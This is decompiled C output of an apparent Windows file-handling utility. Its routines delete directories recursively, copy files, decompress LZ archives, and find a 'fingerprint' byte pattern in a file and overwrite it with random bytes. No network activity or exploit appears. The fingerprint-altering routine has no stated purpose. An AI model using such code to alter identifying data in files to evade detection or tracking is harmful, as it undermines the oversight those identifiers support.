    iVar1 = 0;
  }
  else {
    if (DAT_00425194 == 0xd) {
      pcVar3 = s_Directory___s__NOT_removed__insu_00407d64;
    }
    else if (DAT_00425194 == 2) {
      pcVar3 = s_Directory___s__NOT_removed__not_f_00407d3c;
    }
    else if (DAT_00425194 == 0x29) {
      pcVar3 = s_Directory___s__NOT_removed__not_e_00407d14;
    }
    else {
      pcVar3 = s_Directory___s__NOT_removed__unkn_00407ce8;
    }
    FUN_0041546e(local_104,(byte *)pcVar3);
    uVar2 = extraout_DL_00;
    iVar1 = DAT_00425194;
  }
  FUN_004116e9(param_1,uVar2,&DAT_00407848,s_Remove_Directory_00407cd4,local_104);
  return iVar1;
}



DWORD __cdecl FUN_00413ea3(int param_1,LPCSTR param_2)

{
  int iVar1;
  DWORD DVar2;
  uint uVar3;
  BOOL BVar4;
  void *this;
  void *this_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar5;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined1 *puVar6;
  uint local_a48 [256];
  char local_648 [1024];
  _WIN32_FIND_DATAA local_248;
  char local_108 [256];
  HANDLE local_8;
  
  iVar1 = FUN_00415d42(local_a48,(uint *)0x400);
  if (iVar1 == 0) {
    FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
                 s_Error_retrieving_the_current_dir_004078d0);
    return 0xffffffff;
  }
  iVar1 = FUN_00415cbc(param_2);
  if (iVar1 != 0) {
    FUN_0041546e(local_108,(byte *)s_Error_changing_the_working_direc_00407a24);
    FUN_004116e9(param_1,extraout_DL_00,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
                 local_108);
    return 0xfffffffe;
  }
  local_8 = FindFirstFileA(&DAT_0040658c,&local_248);
  if (local_8 == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
    if (DVar2 == 2) {
      DVar2 = 0;
      FUN_0041546e(local_108,(byte *)s___s__NOT_found_in___s___00407a08);
      uVar5 = extraout_DL_01;
    }
    else {
      FUN_0041546e(local_108,(byte *)s_Error__d_searching_for___s__in___004079e0);
      uVar5 = extraout_DL_02;
    }
    FUN_004116e9(param_1,uVar5,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,local_108);
    return DVar2;
  }
  FUN_0041546e(local_108,(byte *)s_First_file_found___s_00407e1c);
  FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
               local_108);
  if (local_248.dwFileAttributes == 0x10) {
    puVar6 = &DAT_004079dc;
    uVar3 = FUN_0041dd90(this,(byte *)local_248.cFileName,&DAT_004079dc);
    if ((uVar3 != 0) &&
       (uVar3 = FUN_0041dd90(puVar6,(byte *)local_248.cFileName,&DAT_004079d8), uVar3 != 0)) {
      FUN_0041546e(local_648,(byte *)s__s__s_0040460c);
      FUN_0041546e(local_108,(byte *)s__s_is_a_Directory_00407e08);
      FUN_004116e9(param_1,extraout_DL_04,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
                   local_108);
      FUN_00413ea3(param_1,local_648);
      goto LAB_0041417b;
    }
  }
  while (BVar4 = FindNextFileA(local_8,&local_248), BVar4 != 0) {
    FUN_0041546e(local_108,(byte *)s_File_found___s_00407df8);
    FUN_004116e9(param_1,extraout_DL_05,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
                 local_108);
    if (local_248.dwFileAttributes == 0x10) {
      puVar6 = &DAT_004079dc;
      uVar3 = FUN_0041dd90(this_00,(byte *)local_248.cFileName,&DAT_004079dc);
      if ((uVar3 != 0) &&
         (uVar3 = FUN_0041dd90(puVar6,(byte *)local_248.cFileName,&DAT_004079d8), uVar3 != 0)) {
        FUN_0041546e(local_648,(byte *)s__s__s_0040460c);
        FUN_0041546e(local_108,(byte *)s__s_is_a_directory_00407de4);
        FUN_004116e9(param_1,extraout_DL_06,&DAT_00407848,
                     s_Remove_Directory_And_SubDirector_00407e34,local_108);
        FUN_00413ea3(param_1,local_648);
      }
    }
  }
  DVar2 = GetLastError();
  if (DVar2 != 0x12) {
    FUN_0041546e(local_108,(byte *)s_Error__d_searching_for___s__in___004079e0);
    FUN_004116e9(param_1,extraout_DL_07,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
                 local_108);
  }
LAB_0041417b:
  FindClose(local_8);
  FUN_0041546e(local_108,(byte *)s_Removing_contents_of_the_folder__00407dbc);
  FUN_004116e9(param_1,extraout_DL_08,&DAT_00407848,s_Remove_Directory_And_SubDirector_00407e34,
               local_108);
  FUN_00413512(param_1,param_2,&DAT_0040658c);
  FUN_00415cbc(&DAT_004079d8);
  DVar2 = FUN_00413e0c(param_1,param_2);
  return DVar2;
}



int __cdecl FUN_004141d9(int param_1,LPCSTR param_2)

{
  int iVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  char *pcVar3;
  char local_104 [256];
  
  iVar1 = FUN_004166f2(param_2);
  if (iVar1 == 0) {
    FUN_0041546e(local_104,(byte *)s_Directory___s__created__00407f2c);
    uVar2 = extraout_DL;
    iVar1 = 0;
  }
  else {
    if (DAT_00425194 == 0xd) {
      pcVar3 = s_Directory___s__NOT_created__insu_00407ef0;
    }
    else if (DAT_00425194 == 2) {
      pcVar3 = s_Directory___s__NOT_created__not_f_00407ec8;
    }
    else if (DAT_00425194 == 0x11) {
      pcVar3 = s_Directory___s__already_exists__n_00407e98;
    }
    else {
      pcVar3 = s_Directory___s__NOT_created__unkn_00407e6c;
    }
    FUN_0041546e(local_104,(byte *)pcVar3);
    uVar2 = extraout_DL_00;
    iVar1 = DAT_00425194;
  }
  FUN_004116e9(param_1,uVar2,&DAT_00407848,s_Create_Directory_00407e58,local_104);
  return iVar1;
}



bool __cdecl FUN_00414270(int param_1,LPCSTR param_2,LPCSTR param_3)

{
  BOOL BVar1;
  DWORD dwMessageId;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  CHAR local_204 [256];
  char local_104 [256];
  
  BVar1 = CopyFileA(param_2,param_3,0);
  if (BVar1 == 0) {
    dwMessageId = GetLastError();
    FormatMessageA(0x1000,(LPCVOID)0x0,dwMessageId,0,local_204,0x100,(va_list *)0x0);
    FUN_0041546e(local_104,(byte *)s_File___s__NOT_copied_to___s____s_00407f54);
    uVar2 = extraout_DL_00;
  }
  else {
    FUN_0041546e(local_104,(byte *)s_File___s__copied_to___s___00407f78);
    uVar2 = extraout_DL;
  }
  FUN_004116e9(param_1,uVar2,&DAT_00407848,s_Copy_File_00407f48,local_104);
  return BVar1 == 0;
}



void __cdecl FUN_0041430f(int param_1,char *param_2,char *param_3,LPCSTR param_4)

{
  char cVar1;
  bool bVar2;
  uint *puVar3;
  HANDLE hFindFile;
  DWORD DVar4;
  BOOL BVar5;
  int iVar6;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar7;
  undefined extraout_DL_02;
  char *pcVar8;
  _WIN32_FIND_DATAA local_344;
  uint local_204 [64];
  char local_104 [256];
  
  iVar6 = -1;
  pcVar8 = param_2;
  do {
    if (iVar6 == 0) break;
    iVar6 = iVar6 + -1;
    cVar1 = *pcVar8;
    pcVar8 = pcVar8 + 1;
  } while (cVar1 != '\0');
  if (iVar6 == -2) {
    iVar6 = -1;
    pcVar8 = param_3;
    do {
      if (iVar6 == 0) break;
      iVar6 = iVar6 + -1;
      cVar1 = *pcVar8;
      pcVar8 = pcVar8 + 1;
    } while (cVar1 != '\0');
    param_2 = param_3;
    if (iVar6 == -2) {
      param_2 = &DAT_00406d74;
    }
  }
  FUN_00415cbc(param_2);
  iVar6 = FUN_00415cbc(param_4);
  if ((iVar6 != 0) && (iVar6 = FUN_004166f2(param_4), iVar6 == 0)) {
    FUN_00415cbc(param_4);
  }
  FUN_00415d42(local_204,(uint *)0x100);
  FUN_0041546e(local_104,(byte *)s_The_current_working_directory_is_00408010);
  FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Setup_Working_Directory_00407ff8,local_104);
  puVar3 = FUN_00415a80(local_204,param_4);
  if (puVar3 != (uint *)0x0) {
    hFindFile = FindFirstFileA(&DAT_00407ff4,&local_344);
    if (hFindFile == (HANDLE)0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 == 2) {
        FUN_0041546e(local_104,(byte *)s_No_files_found_in_the_working_di_00407fc4);
        uVar7 = extraout_DL_00;
      }
      else {
        FUN_0041546e(local_104,(byte *)s_Error__d_searching_the_temp_dire_00407f94);
        uVar7 = extraout_DL_01;
      }
      FUN_004116e9(param_1,uVar7,&DAT_00407848,s_Setup_Working_Directory_00407ff8,local_104);
    }
    else {
      bVar2 = false;
      do {
        FUN_00415cb1(local_344.cFileName);
        BVar5 = FindNextFileA(hFindFile,&local_344);
        if (BVar5 == 0) {
          DVar4 = GetLastError();
          if (DVar4 != 0x12) {
            FUN_0041546e(local_104,(byte *)s_Error__d_searching_the_temp_dire_00407f94);
            FUN_004116e9(param_1,extraout_DL_02,&DAT_00407848,s_Setup_Working_Directory_00407ff8,
                         local_104);
          }
          bVar2 = true;
        }
      } while (!bVar2);
      FindClose(hFindFile);
    }
  }
  return;
}



void __cdecl FUN_004144ad(int param_1)

{
  int iVar1;
  undefined extraout_DL;
  char *pcVar2;
  uint local_504 [256];
  char local_104 [256];
  
  FUN_00415d42(local_504,(uint *)0x100);
  iVar1 = FUN_004132f2(param_1,(LPCSTR)local_504);
  if (iVar1 == 1) {
    FUN_00413512(param_1,(LPCSTR)local_504,&DAT_00407ff4);
    FUN_00415cbc(&DAT_00406d74);
    iVar1 = FUN_00413e0c(param_1,(LPCSTR)local_504);
    if (iVar1 == 0) {
      pcVar2 = s_Sucessfully_deleted_Clear_Search_004080bc;
    }
    else {
      pcVar2 = s_Error_deleting_Clear_Search_temp_00408088;
    }
  }
  else {
    pcVar2 = s_Clear_Search_temp_directory_in___00408054;
  }
  FUN_0041546e(local_104,(byte *)pcVar2);
  FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Cleanup_Working_Directory_00408038,local_104);
  return;
}



void __cdecl FUN_0041455b(undefined *param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  void *this;
  undefined *puVar3;
  char *pcVar4;
  void *local_8;
  
  local_8 = (void *)0x0;
  uVar2 = 0xffffffff;
  pcVar4 = param_2;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar4 + 1;
  } while (cVar1 != '\0');
  this = (void *)(~uVar2 - 1);
  if (this != (void *)0x0) {
    puVar3 = param_1;
    do {
      uVar2 = FUN_004165fd(this,(int)(char)puVar3[(int)param_2 - (int)param_1]);
      local_8 = (void *)((int)local_8 + 1);
      *puVar3 = (char)uVar2;
      uVar2 = 0xffffffff;
      puVar3 = puVar3 + 1;
      pcVar4 = param_2;
      do {
        if (uVar2 == 0) break;
        uVar2 = uVar2 - 1;
        cVar1 = *pcVar4;
        pcVar4 = pcVar4 + 1;
      } while (cVar1 != '\0');
      this = (void *)(~uVar2 - 1);
    } while (local_8 < this);
  }
  *(undefined *)((int)local_8 + (int)param_1) = 0;
  return;
}



void __cdecl FUN_004145ae(undefined *param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  void *this;
  undefined *puVar3;
  char *pcVar4;
  void *local_8;
  
  local_8 = (void *)0x0;
  uVar2 = 0xffffffff;
  pcVar4 = param_2;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar4 + 1;
  } while (cVar1 != '\0');
  this = (void *)(~uVar2 - 1);
  if (this != (void *)0x0) {
    puVar3 = param_1;
    do {
      uVar2 = FUN_0041671e(this,(int)(char)puVar3[(int)param_2 - (int)param_1]);
      local_8 = (void *)((int)local_8 + 1);
      *puVar3 = (char)uVar2;
      uVar2 = 0xffffffff;
      puVar3 = puVar3 + 1;
      pcVar4 = param_2;
      do {
        if (uVar2 == 0) break;
        uVar2 = uVar2 - 1;
        cVar1 = *pcVar4;
        pcVar4 = pcVar4 + 1;
      } while (cVar1 != '\0');
      this = (void *)(~uVar2 - 1);
    } while (local_8 < this);
  }
  *(undefined *)((int)local_8 + (int)param_1) = 0;
  return;
}



int __cdecl FUN_00414601(int param_1,LPCSTR param_2,byte **param_3)

{
  char cVar1;
  byte **ppbVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined extraout_DL_10;
  undefined uVar5;
  int iVar6;
  uint *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  char *pcVar10;
  char local_120 [256];
  undefined4 *local_20;
  undefined4 *local_1c;
  undefined4 *local_18;
  int local_14;
  undefined4 *local_10;
  uint local_c;
  byte **local_8;
  
  ppbVar2 = (byte **)FUN_004154e0(param_2,&DAT_004041b8);
  local_8 = ppbVar2;
  if (ppbVar2 == (byte **)0x0) {
    pcVar10 = s_Error_opening_file___s__for_read_00404190;
LAB_00414637:
    FUN_0041546e(local_120,(byte *)pcVar10);
    uVar5 = extraout_DL;
  }
  else {
    FUN_0041546e(local_120,(byte *)s_Opened_file___s__for_reading__00404170);
    FUN_004116e9(param_1,extraout_DL_00,&DAT_00407848,s_Randomize_File_00408234,local_120);
    FUN_004153e2((char **)ppbVar2,0,2);
    uVar3 = FUN_0041528a((char **)ppbVar2);
    local_c = uVar3;
    FUN_0041546e(local_120,(byte *)s_file_size_is__d_bytes__00404140);
    FUN_004116e9(param_1,extraout_DL_01,&DAT_00407848,s_Randomize_File_00408234,local_120);
    puVar7 = (uint *)(uVar3 + 8);
    local_10 = (undefined4 *)FUN_00415216(puVar7);
    if (local_10 == (undefined4 *)0x0) {
      pcVar10 = s_error_allocating__ld_bytes_for_f_00404118;
      goto LAB_00414637;
    }
    puVar8 = local_10;
    for (uVar3 = (uint)puVar7 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar8 = 0;
      puVar8 = puVar8 + 1;
    }
    for (uVar3 = (uint)puVar7 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar8 = 0;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    FUN_0041546e(local_120,(byte *)s_Allocated__ld_bytes_for_storing_f_004040f0);
    FUN_004116e9(param_1,extraout_DL_02,&DAT_00407848,s_Randomize_File_00408234,local_120);
    FUN_004153e2((char **)local_8,0,0);
    uVar3 = FUN_0041512e(local_10,1,local_c,local_8);
    if (uVar3 == local_c) {
      FUN_004150d8((int *)local_8);
      FUN_0041546e(local_120,(byte *)(s__successfully_read__ld_bytes_fro_00404087 + 1));
      FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,s_Randomize_File_00408234,local_120);
      FUN_004116e9(param_1,extraout_DL_04,&DAT_00407848,s_Randomize_File_00408234,local_120);
      local_14 = 0;
      local_8 = param_3;
      local_18 = (undefined4 *)(local_c + (int)local_10);
      puVar8 = local_10;
      if (local_10 < local_18) {
        do {
          local_8 = param_3;
          if (*(char *)puVar8 == *(char *)param_3) {
            local_20 = puVar8;
            FUN_0041546e(local_120,(byte *)s_first_byte_match_found_at_addres_00408200);
            FUN_004116e9(param_1,extraout_DL_05,&DAT_00407848,s_Randomize_File_00408234,local_120);
            cVar1 = *(char *)puVar8;
            ppbVar2 = param_3;
            while (((cVar1 == *(char *)ppbVar2 && (*(char *)ppbVar2 != '\0')) && (cVar1 != '\0'))) {
              pcVar10 = (char *)((int)puVar8 + 1);
              puVar8 = (undefined4 *)((int)puVar8 + 1);
              ppbVar2 = (byte **)((int)local_8 + 1);
              local_8 = ppbVar2;
              cVar1 = *pcVar10;
            }
            if (*(char *)local_8 == '\0') {
              local_14 = local_14 + 1;
              local_1c = local_20;
            }
          }
          else {
            puVar8 = (undefined4 *)((int)puVar8 + 1);
          }
          puVar9 = local_1c;
          local_8 = param_3;
        } while (puVar8 < local_18);
        if (local_14 == 1) {
          uVar4 = FUN_00415fa1((int *)0x0);
          FUN_00416585(uVar4);
          if (*(char *)param_3 != '\0') {
            local_18 = (undefined4 *)((int)param_3 - (int)puVar9);
            do {
              uVar3 = FUN_0041658f();
              FUN_0041546e(local_120,(byte *)s_changing_address_0x_2x_offset_0x_004081c4);
              FUN_004116e9(param_1,extraout_DL_06,&DAT_00407848,s_Randomize_File_00408234,local_120)
              ;
              *(char *)puVar9 = (char)((int)uVar3 / 0x80);
              puVar9 = (undefined4 *)((int)puVar9 + 1);
            } while (*(char *)((int)local_18 + (int)puVar9) != '\0');
          }
          local_8 = (byte **)FUN_004154e0(param_2,&DAT_00404acc);
          if (local_8 == (byte **)0x0) {
            pcVar10 = s_Error_opening_file___s__for_writ_0040819c;
            goto LAB_00414637;
          }
          FUN_0041546e(local_120,(byte *)s_Opened_file___s__for_writing__0040817c);
          FUN_004116e9(param_1,extraout_DL_07,&DAT_00407848,s_Randomize_File_00408234,local_120);
          uVar3 = FUN_00415b00(local_10,1,local_c,(char **)local_8);
          if (uVar3 != local_c) {
            pcVar10 = s_error_writing_file___ld_bytes_wr_00408144;
            goto LAB_004148fd;
          }
          FUN_004150d8((int *)local_8);
          FUN_0041546e(local_120,(byte *)s_successfully_wrote__ld_bytes_to_f_00408118);
          FUN_004116e9(param_1,extraout_DL_09,&DAT_00407848,s_Randomize_File_00408234,local_120);
        }
      }
      FUN_004150a9(local_10);
      iVar6 = local_14;
      FUN_0041546e(local_120,(byte *)s__d_pattern_match_instances_found_004080f4);
      uVar5 = extraout_DL_10;
      goto LAB_00414962;
    }
    pcVar10 = s_error_reading_file___ld_bytes_re_004040bc;
LAB_004148fd:
    FUN_0041546e(local_120,(byte *)pcVar10);
    uVar5 = extraout_DL_08;
  }
  iVar6 = -1;
LAB_00414962:
  FUN_004116e9(param_1,uVar5,&DAT_00407848,s_Randomize_File_00408234,local_120);
  return iVar6;
}



int __cdecl FUN_0041497a(int param_1,char *param_2,char *param_3)

{
  char *pcVar1;
  char cVar2;
  byte **ppbVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined uVar6;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  uint *puVar7;
  char local_110 [256];
  undefined4 *local_10;
  undefined4 *local_c;
  byte **local_8;
  
  ppbVar3 = (byte **)FUN_004154e0(param_2,&DAT_004041b8);
  local_8 = ppbVar3;
  if (ppbVar3 == (byte **)0x0) {
    FUN_0041546e(local_110,(byte *)s_Error_opening_file___s__for_read_00404190);
    uVar6 = extraout_DL;
  }
  else {
    FUN_0041546e(local_110,(byte *)s_Opened_file___s__for_reading__00404170);
    FUN_004116e9(param_1,extraout_DL_00,&DAT_00407848,s_Scan_For_Fingerprint_00408244,local_110);
    FUN_004153e2((char **)ppbVar3,0,2);
    puVar4 = (undefined4 *)FUN_0041528a((char **)ppbVar3);
    local_10 = puVar4;
    FUN_0041546e(local_110,(byte *)s_file_size_is__d_bytes__00404140);
    FUN_004116e9(param_1,extraout_DL_01,&DAT_00407848,s_Scan_For_Fingerprint_00408244,local_110);
    puVar7 = puVar4 + 2;
    local_c = (undefined4 *)FUN_00415216(puVar7);
    if (local_c == (undefined4 *)0x0) {
      FUN_0041546e(local_110,(byte *)s_error_allocating__ld_bytes_for_f_00404118);
      uVar6 = extraout_DL_02;
    }
    else {
      puVar4 = local_c;
      for (uVar5 = (uint)puVar7 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar5 = (uint)puVar7 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
        *(undefined *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 1);
      }
      FUN_0041546e(local_110,(byte *)s_Allocated__ld_bytes_for_storing_f_004040f0);
      FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,s_Scan_For_Fingerprint_00408244,local_110);
      FUN_004153e2((char **)local_8,0,0);
      puVar4 = local_c;
      local_c = (undefined4 *)FUN_0041512e(local_c,1,(uint)local_10,local_8);
      if (local_c == local_10) {
        FUN_004150d8((int *)local_8);
        FUN_0041546e(local_110,(byte *)(s__successfully_read__ld_bytes_fro_00404087 + 1));
        FUN_004116e9(param_1,extraout_DL_05,&DAT_00407848,s_Scan_For_Fingerprint_00408244,local_110)
        ;
        FUN_004116e9(param_1,extraout_DL_06,&DAT_00407848,s_Scan_For_Fingerprint_00408244,local_110)
        ;
        local_c = (undefined4 *)0x0;
        local_10 = (undefined4 *)((int)local_10 + (int)puVar4);
        local_8 = (byte **)puVar4;
        if (puVar4 < local_10) {
          do {
            param_2 = param_3;
            if (*(char *)local_8 == *param_3) {
              FUN_0041546e(local_110,(byte *)s_first_byte_match_found_at_addres_00408200);
              FUN_004116e9(param_1,extraout_DL_07,&DAT_00407848,s_Scan_For_Fingerprint_00408244,
                           local_110);
              cVar2 = *(char *)local_8;
              while (((cVar2 == *param_2 && (*param_2 != '\0')) && (cVar2 != '\0'))) {
                pcVar1 = (char *)((int)local_8 + 1);
                local_8 = (byte **)((int)local_8 + 1);
                param_2 = param_2 + 1;
                cVar2 = *pcVar1;
              }
              if (*param_2 == '\0') {
                local_c = (undefined4 *)((int)local_c + 1);
              }
            }
            else {
              local_8 = (byte **)((int)local_8 + 1);
            }
          } while (local_8 < local_10);
        }
        FUN_004150a9(puVar4);
        return (int)local_c;
      }
      FUN_0041546e(local_110,(byte *)s_error_reading_file___ld_bytes_re_004040bc);
      uVar6 = extraout_DL_04;
    }
  }
  FUN_004116e9(param_1,uVar6,&DAT_00407848,s_Scan_For_Fingerprint_00408244,local_110);
  return -1;
}



void __cdecl FUN_00414be0(char *param_1,undefined4 *param_2)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  
  pcVar2 = FUN_00415e60(param_1,'.');
  if (pcVar2 != (char *)0x0) {
    param_1 = pcVar2;
  }
  uVar3 = 0xffffffff;
  do {
    pcVar2 = param_1;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar2 = param_1 + 1;
    cVar1 = *param_1;
    param_1 = pcVar2;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar2 + -uVar3);
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *param_2 = *puVar5;
    puVar5 = puVar5 + 1;
    param_2 = param_2 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)param_2 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    param_2 = (undefined4 *)((int)param_2 + 1);
  }
  return;
}



void __cdecl FUN_00414c18(int param_1,int param_2,char *param_3)

{
  undefined4 uVar1;
  uint uVar2;
  undefined extraout_DL;
  char local_104 [256];
  
  uVar1 = FUN_00415fa1((int *)0x0);
  FUN_00416585(uVar1);
  if (0 < param_2) {
    do {
      uVar2 = FUN_0041658f();
      *param_3 = s_abcdefghijklmnopqrstuvwxyz012345_00407820[(int)uVar2 % 0x24];
      param_3 = param_3 + 1;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  *param_3 = '\0';
  FUN_0041546e(local_104,(byte *)s_Generated_Filename_is__s_00408278);
  FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Generate_Random_Filename_0040825c,local_104);
  return;
}



LPSTR __cdecl FUN_00414c8a(int param_1,LPSTR param_2,LPCSTR param_3)

{
  bool bVar1;
  INT hfDest;
  undefined3 extraout_var;
  int iVar2;
  DWORD dwMessageId;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined extraout_DL_10;
  undefined extraout_DL_11;
  undefined uVar3;
  char *pcVar4;
  _OFSTRUCT local_71c;
  CHAR local_694 [256];
  _OFSTRUCT local_594;
  char local_50c [1024];
  char local_10c [256];
  LONG local_c;
  INT local_8;
  
  local_8 = LZOpenFileA(param_2,&local_71c,0);
  if (local_8 < 0) {
    FUN_0041546e(local_10c,(byte *)s__s__error_opening_source__compre_00408684);
    FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
    if (local_8 == -1) {
      pcVar4 = s__The_handle_identifying_the_sour_00408634;
    }
    else if (local_8 == -5) {
      pcVar4 = s__The_maximum_number_of_open_comp_004085cc;
    }
    else {
      pcVar4 = s__Unknown_error__004085b8;
    }
    FUN_0041546e(local_10c,(byte *)pcVar4);
    param_2 = (LPSTR)0xfffffffe;
    uVar3 = extraout_DL_00;
  }
  else {
    FUN_0041546e(local_10c,(byte *)s__s__opened_source__compressed__f_00408580);
    FUN_004116e9(param_1,extraout_DL_01,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
    FUN_0041546e(local_50c,(byte *)s__s_dat_00408578);
    hfDest = LZOpenFileA(local_50c,&local_594,0x1001);
    if (hfDest < 0) {
      FUN_0041546e(local_10c,(byte *)s__s__error_opening_destination__d_00408530);
      FUN_004116e9(param_1,extraout_DL_02,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
      if (local_8 == -1) {
        pcVar4 = s__The_handle_identifying_the_sour_00408634;
      }
      else if (local_8 == -5) {
        pcVar4 = s__The_maximum_number_of_open_comp_004085cc;
      }
      else {
        pcVar4 = s__Unknown_error__004085b8;
      }
      FUN_0041546e(local_10c,(byte *)pcVar4);
      FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
      LZClose(local_8);
      return (LPSTR)0xfffffffd;
    }
    FUN_0041546e(local_10c,(byte *)s__s__opened_destination__decompre_004084f0);
    FUN_004116e9(param_1,extraout_DL_04,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
    local_c = LZCopy(local_8,hfDest);
    if (local_c < 0) {
      FUN_0041546e(local_10c,(byte *)s__s__error_decompressing_file___s_004084cc);
      FUN_004116e9(param_1,extraout_DL_05,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
      if (local_c == -1) {
        pcVar4 = s__The_handle_identifying_the_sour_00408634;
      }
      else if (local_c == -2) {
        pcVar4 = s__The_handle_identifying_the_dest_00408474;
      }
      else if (local_c == -5) {
        pcVar4 = s__The_maximum_number_of_open_comp_004085cc;
      }
      else if (local_c == -6) {
        pcVar4 = s__The_LZ_file_handle_cannot_be_lo_00408448;
      }
      else if (local_c == -3) {
        pcVar4 = s__The_source_file_format_is_not_v_00408420;
      }
      else {
        pcVar4 = s__Unknown_error__004085b8;
      }
      FUN_0041546e(local_10c,(byte *)pcVar4);
      FUN_004116e9(param_1,extraout_DL_06,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
      LZClose(local_8);
      LZClose(hfDest);
      return (LPSTR)0xfffffffc;
    }
    FUN_0041546e(local_10c,(byte *)s__s__successfully_decompressed_fi_004083ec);
    FUN_004116e9(param_1,extraout_DL_07,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
    FUN_0041546e(local_10c,(byte *)s_Decompressed_file_size_is__d_byt_004083c4);
    FUN_004116e9(param_1,extraout_DL_08,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
    LZClose(local_8);
    LZClose(hfDest);
    bVar1 = FUN_00414270(param_1,local_50c,param_3);
    if (CONCAT31(extraout_var,bVar1) == 0) {
      FUN_0041546e(local_10c,(byte *)s_Successfully_copied_file___s__to_0040839c);
      FUN_004116e9(param_1,extraout_DL_09,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
      iVar2 = FUN_00415cb1(local_50c);
      if (iVar2 == 0) {
        pcVar4 = s_Succesfully_remove_temporary_DAT_0040836c;
      }
      else if (DAT_00425194 == 0xd) {
        pcVar4 = s_Error_removing_temporary_DAT_fil_00408324;
      }
      else if (DAT_00425194 == 2) {
        pcVar4 = s_Error_removing_temporary_DAT_fil_004082f0;
      }
      else {
        pcVar4 = s_Error_removing_temporary_DAT_fil_004082b8;
      }
      FUN_0041546e(local_10c,(byte *)pcVar4);
      FUN_004116e9(param_1,extraout_DL_10,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
      return (LPSTR)0;
    }
    dwMessageId = GetLastError();
    FormatMessageA(0x1000,(LPCVOID)0x0,dwMessageId,0,local_694,0x100,(va_list *)0x0);
    FUN_0041546e(local_10c,(byte *)s_Error_copying_file___s__to___s___00408294);
    param_2 = (LPSTR)0xfffffffb;
    uVar3 = extraout_DL_11;
  }
  FUN_004116e9(param_1,uVar3,&DAT_00407848,s_Decompress_File_004086c4,local_10c);
  return param_2;
}



BOOL VerQueryValueA(LPCVOID pBlock,LPCSTR lpSubBlock,LPVOID *lplpBuffer,PUINT puLen)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041505a. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = VerQueryValueA(pBlock,lpSubBlock,lplpBuffer,puLen);
  return BVar1;
}



